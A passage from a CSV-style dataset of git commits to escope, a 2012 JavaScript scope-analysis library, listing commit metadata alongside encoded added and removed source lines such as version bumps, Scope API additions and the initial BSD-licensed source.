'body']<c><\n>-        LogicalExpression: ['left'<c> 'right']<c><\n>-        MemberExpression: ['object'<c> 'property']<c><\n>-        NewExpression: ['callee'<c> 'arguments']<c><\n>-        ObjectExpression: ['properties']<c><\n>-        Program: ['body']<c><\n>-        Property: ['key'<c> 'value']<c><\n>-        ReturnStatement: ['argument']<c><\n>-        SequenceExpression: ['expressions']<c><\n>-        SwitchStatement: ['discriminant'<c> 'cases']<c><\n>-        SwitchCase: ['test'<c> 'consequent']<c><\n>-        ThisExpression: []<c><\n>-        ThrowStatement: ['argument']<c><\n>-        TryStatement: ['block'<c> 'handlers'<c> 'finalizer']<c><\n>-        UnaryExpression: ['argument']<c><\n>-        UpdateExpression: ['argument']<c><\n>-        VariableDeclaration: ['declarations']<c><\n>-        VariableDeclarator: ['id'<c> 'init']<c><\n>-        WhileStatement: ['test'<c> 'body']<c><\n>-        WithStatement: ['object'<c> 'body']<\n>-    };<\n>-    VisitorOption = {<\n>-        Break: 1<c><\n>-        Skip: 2<\n>-    };<\n>-    function traverse(top<c> visitor) {<\n>-        var worklist<c> leavelist<c> node<c> ret<c> current<c> current2<c> candidates<c> candidate<c> marker = {};<\n>-        worklist = [ top ];<\n>-        leavelist = [ null ];<\n>-        while (worklist.length) {<\n>-            node = worklist.pop();<\n>-            if (node === marker) {<\n>-                node = leavelist.pop();<\n>-                if (visitor.leave) {<\n>-                    ret = visitor.leave(node<c> leavelist[leavelist.length - 1]);<\n>-                } else {<\n>-                    ret = undefined;<\n>-                }<\n>-                if (ret === VisitorOption.Break) {<\n>-                    return;<\n>-                }<\n>-            } else if (node) {<\n>-                if (visitor.enter) {<\n>-                    ret = visitor.enter(node<c> leavelist[leavelist.length - 1]);<\n>-                } else {<\n>-                    ret = undefined;<\n>-                }<\n>-                if (ret === VisitorOption.Break) {<\n>-                    return;<\n>-                }<\n>-                worklist.push(marker);<\n>-                leavelist.push(node);<\n>-                if (ret !== VisitorOption.Skip) {<\n>-                    candidates = VisitorKeys[node.type];<\n>-                    current = candidates.length;<\n>-                    while ((current -= 1) >= 0) {<\n>-                        candidate = node[candidates[current]];<\n>-                        if (candidate) {<\n>-                            if (isArray(candidate)) {<\n>-                                current2 = candidate.length;<\n>-                                while ((current2 -= 1) >= 0) {<\n>-                                    if (candidate[current2]) {<\n>-                                        worklist.push(candidate[current2]);<\n>-                                    }<\n>-                                }<\n>-                            } else {<\n>-                                worklist.push(candidate);<\n>-                            }<\n>-                        }<\n>-                    }<\n>-                }<\n>-            }<\n>-        }<\n>-    }<\n>-        traverse(tree<c> {<\n>,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Tue,17,35,9 Oct 2012,version 0.0.6-dev starts,0,0,2,4,114,"+    VERSION = '0.0.6-dev';<\n>+    ""version"": ""0.0.6-dev""<c><\n>","-    VERSION = '0.0.5-dev';<\n>-    ""version"": ""0.0.5-dev""<c><\n>",F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Tue,17,34,9 Oct 2012,Update traverse function,0,0,1,4,172,+        DirectiveStatement: 'DirectiveStatement'<c><\n>+        DirectiveStatement: ['directive']<c><\n>+                case Syntax.DirectiveStatement:<\n>+                    break;<\n>,,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Sat,11,7,6 Oct 2012,version 0.0.5-dev starts,0,0,2,4,114,"+    VERSION = '0.0.5-dev';<\n>+    ""version"": ""0.0.5-dev""<c><\n>","-    VERSION = '0.0.4-dev';<\n>-    ""version"": ""0.0.4-dev""<c><\n>",F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Sat,11,6,6 Oct 2012,Add Scope#isThisMaterialized,0,0,1,17,590,+        this.thisFound = false;<\n>+    Scope.prototype.__detectThis = function __detectThis() {<\n>+        this.thisFound = true;<\n>+    };<\n>+    // API Scope#isThisMaterialized<\n>+    // return this scope has materialized `this` reference<\n>+    Scope.prototype.isThisMaterialized = function isThisMaterialized() {<\n>+        // This is not function scope<\n>+        if (this.type !== 'function') {<\n>+            return true;<\n>+        }<\n>+        if (!this.isStatic()) {<\n>+            return true;<\n>+        }<\n>+        return this.thisFound;<\n>+    };<\n>+                    scope.variableScope.__detectThis();<\n>,,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Wed,3,51,19 Sep 2012,version 0.0.4-dev starts,0,0,2,4,114,"+    VERSION = '0.0.4-dev';<\n>+    ""version"": ""0.0.4-dev""<c><\n>","-    VERSION = '0.0.3-dev';<\n>-    ""version"": ""0.0.3-dev""<c><\n>",F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Wed,3,46,19 Sep 2012,Fix hash table hasOwnProperty,0,0,1,11,429,+        hasOwnProperty<c><\n>+    hasOwnProperty = (function () {<\n>+        var pred = Object.prototype.hasOwnProperty;<\n>+        return function hasOwnProperty(obj<c> name) {<\n>+            return pred.call(obj<c> name);<\n>+        };<\n>+    }());<\n>+        if (hasOwnProperty(this.set<c> name)) {<\n>+            if (!hasOwnProperty(this.set<c> name)) {<\n>,-        if (this.set.hasOwnProperty(name)) {<\n>-            if (!this.set.hasOwnProperty(name)) {<\n>,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Sun,1,6,16 Sep 2012,version 0.0.3-dev starts,0,0,2,4,114,"+    VERSION = '0.0.3-dev';<\n>+    ""version"": ""0.0.3-dev""<c><\n>","-    VERSION = '0.0.2-dev';<\n>-    ""version"": ""0.0.2-dev""<c><\n>",F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Sun,0,51,16 Sep 2012,Add Scope#isArgumentsMaterialized function Close #1,0,0,1,25,919,+        this.directCallToEvalScope = false;<\n>+        this.directCallToEvalScope = true;<\n>+    // API Scope#isArgumentsMaterialized<\n>+    // return this scope has materialized arguments<\n>+    Scope.prototype.isArgumentsMaterialized = function isArgumentsMaterialized() {<\n>+        // TODO(Constellation)<\n>+        // We can more aggressive on this condition like this.<\n>+        //<\n>+        // function t() {<\n>+        //     // arguments of t is always hidden.<\n>+        //     function arguments() {<\n>+        //     }<\n>+        // }<\n>+        var variable;<\n>+        // This is not function scope<\n>+        if (this.type !== 'function') {<\n>+            return true;<\n>+        }<\n>+        if (!this.isStatic()) {<\n>+            return true;<\n>+        }<\n>+        variable = this.set['arguments'];<\n>+        assert(variable<c> 'always have arguments variable');<\n>+        return variable.tainted || variable.references.length  !== 0;<\n>+    };<\n>,,F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Thu,7,50,13 Sep 2012,version 0.0.2-dev starts,0,0,2,4,114,"+    VERSION = '0.0.2-dev';<\n>+    ""version"": ""0.0.2-dev""<c><\n>","-    VERSION = '0.0.1-dev';<\n>-    ""version"": ""0.0.1-dev""<c><\n>",F
17,56,56,569,4,26,Constellation <utatane.tea@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Thu,7,49,13 Sep 2012,First commit,0,4,4,673,27612,"+Redistribution and use in source and binary forms<c> with or without<\n>+modification<c> are permitted provided that the following conditions are met:<\n>+  * Redistributions of source code must retain the above copyright<\n>+    notice<c> this list of conditions and the following disclaimer.<\n>+  * Redistributions in binary form must reproduce the above copyright<\n>+    notice<c> this list of conditions and the following disclaimer in the<\n>+    documentation and/or other materials provided with the distribution.<\n>+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+(INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+Escope ([escope](http://github.com/Constellation/escope)) is<\n>+[ECMAScript](http://www.ecma-international.org/publications/standards/Ecma-262.htm)<\n>+scope analyzer extracted from [esmangle project](http://github.com/Constellation/esmangle).<\n>+### License<\n>+Copyright (C) 2012 [Yusuke Suzuki](http://github.com/Constellation)<\n>+ (twitter: [@Constellation](http://twitter.com/Constellation)) and other contributors.<\n>+Redistribution and use in source and binary forms<c> with or without<\n>+modification<c> are permitted provided that the following conditions are met:<\n>+  * Redistributions of source code must retain the above copyright<\n>+    notice<c> this list of conditions and the following disclaimer.<\n>+  * Redistributions in binary form must reproduce the above copyright<\n>+    notice<c> this list of conditions and the following disclaimer in the<\n>+    documentation and/or other materials provided with the distribution.<\n>+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+(INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+/*<\n>+  Copyright (C) 2012 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Redistribution and use in source and binary forms<c> with or without<\n>+  modification<c> are permitted provided that the following conditions are met:<\n>+    * Redistributions of source code must retain the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer.<\n>+    * Redistributions in binary form must reproduce the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer in the<\n>+      documentation and/or other materials provided with the distribution.<\n>+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+*/<\n>+/*jslint bitwise:true */<\n>+/*global escope:true<c> exports:true<c> define:true*/<\n>+(function (factory<c> global) {<\n>+    'use strict';<\n>+    function namespace(str<c> obj) {<\n>+        var i<c> iz<c> names<c> name;<\n>+        names = str.split('.');<\n>+        for (i = 0<c> iz = names.length; i < iz; ++i) {<\n>+            name = names[i];<\n>+            if (obj.hasOwnProperty(name)) {<\n>+                obj = obj[name];<\n>+            } else {<\n>+                obj = (obj[name] = {});<\n>+            }<\n>+        }<\n>+        return obj;<\n>+    }<\n>+    // Universal Module Definition (UMD) to support AMD<c> CommonJS/Node.js<c><\n>+    // and plain browser loading<c><\n>+    if (typeof define === 'function' && define.amd) {<\n>+        define('escope'<c> ['exports']<c> factory);<\n>+    } else if (typeof exports !== 'undefined') {<\n>+        factory(exports);<\n>+    } else {<\n>+        factory(namespace('escope'<c> global));<\n>+    }<\n>+    'use strict';<\n>+    var Syntax<c><\n>+        isArray<c><\n>+        VisitorKeys<c><\n>+        VisitorOption<c><\n>+        VERSION<c><\n>+        scope<c><\n>+        scopes;<\n>+    VERSION = '0.0.1-dev';<\n>+    function assert(cond<c> text) {<\n>+        if (!cond) {<\n>+            throw new Error(text);<\n>+        }<\n>+    }<\n>+    function unreachable() {<\n>+        throw new Error('Unreachable point. logically broken.');<\n>+    }<\n>+    Syntax = {<\n>+        AssignmentExpression: 'AssignmentExpression'<c><\n>+        ArrayExpression: 'ArrayExpression'<c><\n>+        BlockStatement: 'BlockStatement'<c><\n>+        BinaryExpression: 'BinaryExpression'<c><\n>+        BreakStatement: 'BreakStatement'<c><\n>+        CallExpression: 'CallExpression'<c><\n>+        CatchClause: 'CatchClause'<c><\n>+        ConditionalExpression: 'ConditionalExpression'<c><\n>+        ContinueStatement: 'ContinueStatement'<c><\n>+        DoWhileStatement: 'DoWhileStatement'<c><\n>+        DebuggerStatement: 'DebuggerStatement'<c><\n>+        EmptyStatement: 'EmptyStatement'<c><\n>+        ExpressionStatement: 'ExpressionStatement'<c><\n>+        ForStatement: 'ForStatement'<c><\n>+        ForInStatement: 'ForInStatement'<c><\n>+        FunctionDeclaration: 'FunctionDeclaration'<c><\n>+        FunctionExpression: 'FunctionExpression'<c><\n>+        Identifier: 'Identifier'<c><\n>+        IfStatement: 'IfStatement'<c><\n>+        Literal: 'Literal'<c><\n>+        LabeledStatement: 'LabeledStatement'<c><\n>+        LogicalExpression: 'LogicalExpression'<c><\n>+        MemberExpression: 'MemberExpression'<c><\n>+        NewExpression: 'NewExpression'<c><\n>+        ObjectExpression: 'ObjectExpression'<c><\n>+        Program: 'Program'<c><\n>+        Property: 'Property'<c><\n>+        ReturnStatement: 'ReturnStatement'<c><\n>+        SequenceExpression: 'SequenceExpression'<c><\n>+        SwitchStatement: 'SwitchStatement'<c><\n>+        SwitchCase: 'SwitchCase'<c><\n>+        ThisExpression: 'ThisExpression'<c><\n>+        ThrowStatement: 'ThrowStatement'<c><\n>+        TryStatement: 'TryStatement'<c><\n>+        UnaryExpression: 'UnaryExpression'<c><\n>+        UpdateExpression: 'UpdateExpression'<c><\n>+        VariableDeclaration: 'VariableDeclaration'<c><\n>+        VariableDeclarator: 'VariableDeclarator'<c><\n>+        WhileStatement: 'WhileStatement'<c><\n>+        WithStatement: 'WithStatement'<\n>+    };<\n>+    // removable traverse function<\n>+    isArray = Array.isArray;<\n>+    if (!isArray) {<\n>+        isArray = function isArray(array) {<\n>+            return Object.prototype.toString.call(array) === '[object Array]';<\n>+        };<\n>+    }<\n>+    VisitorKeys = {<\n>+        AssignmentExpression: ['left'<c> 'right']<c><\n>+        ArrayExpression: ['elements']<c><\n>+        BlockStatement: ['body']<c><\n>+        BinaryExpression: ['left'<c> 'right']<c><\n>+        BreakStatement: ['label']<c><\n>+        CallExpression: ['callee'<c> 'arguments']<c><\n>+        CatchClause: ['param'<c> 'body']<c><\n>+        ConditionalExpression: ['test'<c> 'consequent'<c> 'alternate']<c><\n>+        ContinueStatement: ['label']<c><\n>+        DoWhileStatement: ['body'<c> 'test']<c><\n>+        DebuggerStatement: []<c><\n>+        EmptyStatement: []<c><\n>+        ExpressionStatement: ['expression']<c><\n>+        ForStatement: ['init'<c> 'test'<c> 'update'<c> 'body']<c><\n>+        ForInStatement: ['left'<c> 'right'<c> 'body']<c><\n>+        FunctionDeclaration: ['id'<c> 'params'<c> 'body']<c><\n>+        FunctionExpression: ['id'<c> 'params'<c> 'body']<c><\n>+        Identifier: []<c><\n>+        IfStatement: ['test'<c> 'consequent'<c> 'alternate']<c><\n>+        Literal: []<c><\n>+        LabeledStatement: ['label'<c> 'body']<c><\n>+        LogicalExpression: ['left'<c> 'right']<c><\n>+        MemberExpression: ['object'<c> 'property']<c><\n>+        NewExpression: ['callee'<c> 'arguments']<c><\n>+        ObjectExpression: ['properties']<c><\n>+        Program: ['body']<c><\n>+        Property: ['key'<c> 'value']<c><\n>+        ReturnStatement: ['argument']<c><\n>+        SequenceExpression: ['expressions']<c><\n>+        SwitchStatement: ['discriminant'<c> 'cases']<c><\n>+        SwitchCase: ['test'<c> 'consequent']<c><\n>+        ThisExpression: []<c><\n>+        ThrowStatement: ['argument']<c><\n>+        TryStatement: ['block'<c> 'handlers'<c> 'finalizer']<c><\n>+        UnaryExpression: ['argument']<c><\n>+        UpdateExpression: ['argument']<c><\n>+        VariableDeclaration: ['declarations']<c><\n>+        VariableDeclarator: ['id'<c> 'init']<c><\n>+        WhileStatement: ['test'<c> 'body']<c><\n>+        WithStatement: ['object'<c> 'body']<\n>+    };<\n>+    VisitorOption = {<\n>+        Break: 1<c><\n>+        Skip: 2<\n>+    };<\n>+    function traverse(top<c> visitor) {<\n>+        var worklist<c> leavelist<c> node<c> ret<c> current<c> current2<c> candidates<c> candidate<c> marker = {};<\n>+        worklist = [ top ];<\n>+        leavelist = [ null ];<\n>+        while (worklist.length) {<\n>+            node = worklist.pop();<\n>+            if (node === marker) {<\n>+                node = leavelist.pop();<\n>+                if (visitor.leave) {<\n>+                    ret = visitor.leave(node<c> leavelist[leavelist.length - 1]);<\n>+                } else {<\n>+                    ret = undefined;<\n>+                }<\n>+                if (ret === VisitorOption.Break) {<\n>+                    return;<\n>+                }<\n>+            } else if (node) {<\n>+                if (visitor.enter) {<\n>+                    ret = visitor.enter(node<c> leavelist[leavelist.length - 1]);<\n>+                } else {<\n>+                    ret = undefined;<\n>+                }<\n>+                if (ret === VisitorOption.Break) {<\n>+                    return;<\n>+                }<\n>+                worklist.push(marker);<\n>+                leavelist.push(node);<\n>+                if (ret !== VisitorOption.Skip) {<\n>+                    candidates = VisitorKeys[node.type];<\n>+                    current = candidates.length;<\n>+                    while ((current -= 1) >= 0) {<\n>+                        candidate = node[candidates[current]];<\n>+                        if (candidate) {<\n>+                            if (isArray(candidate)) {<\n>+                                current2 = candidate.length;<\n>+                                while ((current2 -= 1) >= 0) {<\n>+                                    if (candidate[current2]) {<\n>+                                        worklist.push(candidate[current2]);<\n>+                                    }<\n>+                                }<\n>+                            } else {<\n>+                                worklist.push(candidate);<\n>+                            }<\n>+                        }<\n>+                    }<\n>+                }<\n>+            }<\n>+        }<\n>+    }<\n>+    function Reference(ident<c> scope) {<\n>+        this.identifier = ident;<\n>+        this.from = scope;<\n>+        this.tainted = false;<\n>+        this.resolved = null;<\n>+    }<\n>+    Reference.prototype.isStatic = function isStatic() {<\n>+        return !this.tainted && this.resolved && this.resolved.scope.isStatic();<\n>+    };<\n>+    function Variable(name<c> scope) {<\n>+        this.name = name;<\n>+        this.identifiers = [];<\n>+        this.references = [];<\n>+        this.tainted = false;<\n>+        this.stack = true;<\n>+        this.scope = scope;<\n>+    }<\n>+    function Scope(block<c> opt) {<\n>+        var variable;<\n>+        this.type =<\n>+            (block.type === Syntax.CatchClause) ? 'catch' :<\n>+            (block.type === Syntax.WithStatement) ? 'with' :<\n>+            (block.type === Syntax.Program) ? 'global' : 'function';<\n>+        this.set = {};<\n>+        this.tip = 'a';<\n>+        this.dynamic = this.type === 'global' || this.type === 'with';<\n>+        this.block = block;<\n>+        this.through = [];<\n>+        this.variables = [];<\n>+        this.references = [];<\n>+        this.taints = {};<\n>+        this.left = [];<\n>+        this.variableScope =<\n>+            (this.type === 'global' || this.type === 'function') ? this : scope.variableScope;<\n>+        this.functionExpressionScope = false;<\n>+        if (opt.naming) {<\n>+            this.__define(block.id);<\n>+            this.functionExpressionScope = true;<\n>+        } else {<\n>+            if (this.type === 'function') {<\n>+                variable = new Variable('arguments'<c> this);<\n>+                this.taints['arguments'] = true;<\n>+                this.set['arguments'] = variable;<\n>+                this.variables.push(variable);<\n>+            }<\n>+            if (block.type === Syntax.FunctionExpression && block.id) {<\n>+                new Scope(block<c> { naming: true });<\n>+            }<\n>+        }<\n>+        // RAII<\n>+        this.upper = scope;<\n>+        scope = this;<\n>+        scopes.push(this);<\n>+    }<\n>+    Scope.prototype.__close = function __close() {<\n>+        var i<c> iz<c> ref<c> set<c> current;<\n>+        // Because if this is global environment<c> upper is null<\n>+        if (!this.dynamic) {<\n>+            // static resolve<\n>+            for (i = 0<c> iz = this.left.length; i < iz; ++i) {<\n>+                ref = this.left[i];<\n>+                if (!this.__resolve(ref)) {<\n>+                    this.__delegateToUpperScope(ref);<\n>+                }<\n>+            }<\n>+        } else {<\n>+            // this is global / with / function with eval environment<\n>+            if (this.type === 'with') {<\n>+                for (i = 0<c> iz = this.left.length; i < iz; ++i) {<\n>+                    ref = this.left[i];<\n>+                    ref.tainted = true;<\n>+                    this.__delegateToUpperScope(ref);<\n>+                }<\n>+            } else {<\n>+                for (i = 0<c> iz = this.left.length; i < iz; ++i) {<\n>+                    // notify all names are through to global<\n>+                    ref = this.left[i];<\n>+                    current = this;<\n>+                    do {<\n>+                        current.through.push(ref);<\n>+                        current = current.upper;<\n>+                    } while (current);<\n>+                }<\n>+            }<\n>+        }<\n>+        this.left = null;<\n>+        scope = this.upper;<\n>+    };<\n>+    Scope.prototype.__resolve = function __resolve(ref) {<\n>+        var i<c> iz<c> variable<c> name;<\n>+        name = ref.identifier.name;<\n>+        if (this.set.hasOwnProperty(name)) {<\n>+            variable = this.set[name];<\n>+            variable.references.push(ref);<\n>+            variable.stack = variable.stack && ref.from.variableScope === this.variableScope;<\n>+            if (ref.tainted) {<\n>+                variable.tainted = true;<\n>+                this.taints[variable.name] = true;<\n>+            }<\n>+            ref.resolved = variable;<\n>+            return true;<\n>+        }<\n>+        return false;<\n>+    };<\n>+    Scope.prototype.__delegateToUpperScope = function __delegateToUpperScope(ref) {<\n>+        assert(this.upper<c> 'upper should be here');<\n>+        this.upper.left.push(ref);<\n>+        this.through.push(ref);<\n>+    };<\n>+    Scope.prototype.__define = function __define(node) {<\n>+        var name<c> variable;<\n>+        if (node && node.type === Syntax.Identifier) {<\n>+            name = node.name;<\n>+            if (!this.set.hasOwnProperty(name)) {<\n>+                variable = new Variable(name<c> this);<\n>+                variable.identifiers.push(node);<\n>+                this.set[name] = variable;<\n>+                this.variables.push(variable);<\n>+            } else {<\n>+                variable = this.set[name];<\n>+                variable.identifiers.push(node);<\n>+            }<\n>+        }<\n>+    };<\n>+    Scope.prototype.__referencing = function __referencing(node) {<\n>+        var ref;<\n>+        // because Array element may be null<\n>+        if (node && node.type === Syntax.Identifier) {<\n>+            ref = new Reference(node<c> this);<\n>+            this.references.push(ref);<\n>+            this.left.push(ref);<\n>+        }<\n>+    };<\n>+    Scope.prototype.__detectEval = function __detectEval() {<\n>+        var current;<\n>+        current = this;<\n>+        do {<\n>+            current.dynamic = true;<\n>+            current = current.upper;<\n>+        } while (current);<\n>+    };<\n>+    Scope.prototype.__isClosed = function isClosed() {<\n>+        return this.left === null;<\n>+    };<\n>+    // API Scope#resolve(name)<\n>+    // returns resolved reference<\n>+    Scope.prototype.resolve = function resolve(ident) {<\n>+        var ref<c> i<c> iz;<\n>+        assert(this.__isClosed()<c> ""scope should be closed"");<\n>+        assert(ident.type === Syntax.Identifier<c> ""target should be identifier"");<\n>+        for (i = 0<c> iz = this.references.length; i < iz; ++i) {<\n>+            ref = this.references[i];<\n>+            if (ref.identifier === ident) {<\n>+                return ref;<\n>+            }<\n>+        }<\n>+        unreachable();<\n>+    };<\n>+    // API Scope#isStatic<\n>+    // returns this scope is static<\n>+    Scope.prototype.isStatic = function isStatic() {<\n>+        return !this.dynamic;<\n>+    };<\n>+    Scope.name = '__$escope$__';<\n>+    Scope.prototype.attach = function attach() {<\n>+        if (!this.functionExpressionScope) {<\n>+            this.block.__$escope$__ = this;<\n>+        }<\n>+    };<\n>+    Scope.prototype.detach = function detach() {<\n>+        if (!this.functionExpressionScope) {<\n>+            delete this.block.__$escope$__;<\n>+        }<\n>+    };<\n>+    function ScopeManager(scopes) {<\n>+        this.scopes = scopes;<\n>+        this.attached = false;<\n>+    }<\n>+    // Returns appropliate scope for this node<\n>+    ScopeManager.prototype.__get = function __get(node) {<\n>+        var i<c> iz<c> scope;<\n>+        if (this.attached) {<\n>+            return node.__$escope$__ || null;<\n>+        }<\n>+        if (Scope.isRequired(node)) {<\n>+            for (i = 0<c> iz = this.scopes.length; i < iz; ++i) {<\n>+                scope = this.scopes[i];<\n>+                if (!scope.functionExpressionScope) {<\n>+                    if (scope.block === node) {<\n>+                        return scope;<\n>+                    }<\n>+                }<\n>+            }<\n>+        }<\n>+        return null;<\n>+    };<\n>+    ScopeManager.prototype.acquire = function acquire(node) {<\n>+        return this.__get(node);<\n>+    };<\n>+    ScopeManager.prototype.release = function release(node) {<\n>+        var scope = this.__get(node);<\n>+        if (scope) {<\n>+            scope = scope.upper;<\n>+            while (scope) {<\n>+                if (!scope.functionExpressionScope) {<\n>+                    return scope;<\n>+                }<\n>+                scope = scope.upper;<\n>+            }<\n>+        }<\n>+        return null;<\n>+    };<\n>+    ScopeManager.prototype.attach = function attach() {<\n>+        var i<c> iz<c> scope;<\n>+        for (i = 0<c> iz = this.scopes.length; i < iz; ++i) {<\n>+            this.scopes[i].attach();<\n>+        }<\n>+        this.attached = true;<\n>+    };<\n>+    ScopeManager.prototype.detach = function detach() {<\n>+        var i<c> iz<c> scope;<\n>+        for (i = 0<c> iz = this.scopes.length; i < iz; ++i) {<\n>+            this.scopes[i].detach();<\n>+        }<\n>+        this.attached = false;<\n>+    };<\n>+    Scope.isRequired = function isRequired(node) {<\n>+        return node.type === Syntax.Program || node.type === Syntax.FunctionExpression || node.type === Syntax.FunctionDeclaration || node.type === Syntax.WithStatement || node.type === Syntax.CatchClause;<\n>+    };<\n>+    function analyze(tree) {<\n>+        scopes = [];<\n>+        scope = null;<\n>+        // attach scope and collect / resolve names<\n>+        traverse(tree<c> {<\n>+            enter: function enter(node) {<\n>+                var i<c> iz;<\n>+                if (Scope.isRequired(node)) {<\n>+                    new Scope(node<c> {});<\n>+                }<\n>+                switch (node.type) {<\n>+                case Syntax.AssignmentExpression:<\n>+                    scope.__referencing(node.left);<\n>+                    scope.__referencing(node.right);<\n>+                    break;<\n>+                case Syntax.ArrayExpression:<\n>+                    for (i = 0<c> iz = node.elements.length; i < iz; ++i) {<\n>+                        scope.__referencing(node.elements[i]);<\n>+                    }<\n>+                    break;<\n>+                case Syntax.BlockStatement:<\n>+                    break;<\n>+                case Syntax.BinaryExpression:<\n>+                    scope.__referencing(node.left);<\n>+                    scope.__referencing(node.right);<\n>+                    break;<\n>+                case Syntax.BreakStatement:<\n>+                    break;<\n>+                case Syntax.CallExpression:<\n>+                    scope.__referencing(node.callee);<\n>+                    for (i = 0<c> iz = node['arguments'].length; i < iz; ++i) {<\n>+                        scope.__referencing(node['arguments'][i]);<\n>+                    }<\n>+                    // check this is direct call to eval<\n>+                    if (node.callee.type === Syntax.Identifier && node.callee.name === 'eval') {<\n>+                        scope.variableScope.__detectEval();<\n>+                    }<\n>+                    break;<\n>+                case Syntax.CatchClause:<\n>+                    scope.__define(node.param);<\n>+                    break;<\n>+                case Syntax.ConditionalExpression:<\n>+                    scope.__referencing(node.test);<\n>+                    scope.__referencing(node.consequent);<\n>+                    scope.__referencing(node.alternate);<\n>+                    break;<\n>+                case Syntax.ContinueStatement:<\n>+                    break;<\n>+                case Syntax.DoWhileStatement:<\n>+                    scope.__referencing(node.test);<\n>+                    break;<\n>+                case Syntax.DebuggerStatement:<\n>+                    break;<\n>+                case Syntax.EmptyStatement:<\n>+                    break;<\n>+                case Syntax.ExpressionStatement:<\n>+                    scope.__referencing(node.expression);<\n>+                    break;<\n>+                case Syntax.ForStatement:<\n>+                    scope.__referencing(node.init);<\n>+                    scope.__referencing(node.test);<\n>+                    scope.__referencing(node.update);<\n>+                    break;<\n>+                case Syntax.ForInStatement:<\n>+                    scope.__referencing(node.left);<\n>+                    scope.__referencing(node.right);<\n>+                    break;<\n>+                case Syntax.FunctionDeclaration:<\n>+                    // FunctionDeclaration name is defined in upper scope<\n>+                    scope.upper.__define(node.id);<\n>+                    for (i = 0<c> iz = node.params.length; i < iz; ++i) {<\n>+                        scope.__define(node.params[i]);<\n>+                    }<\n>+                    break;<\n>+                case Syntax.FunctionExpression:<\n>+                    // id is defined in upper scope<\n>+                    for (i = 0<c> iz = node.params.length; i < iz; ++i) {<\n>+                        scope.__define(node.params[i]);<\n>+                    }<\n>+                    break;<\n>+                case Syntax.Identifier:<\n>+                    break;<\n>+                case Syntax.IfStatement:<\n>+                    scope.__referencing(node.test);<\n>+                    break;<\n>+                case 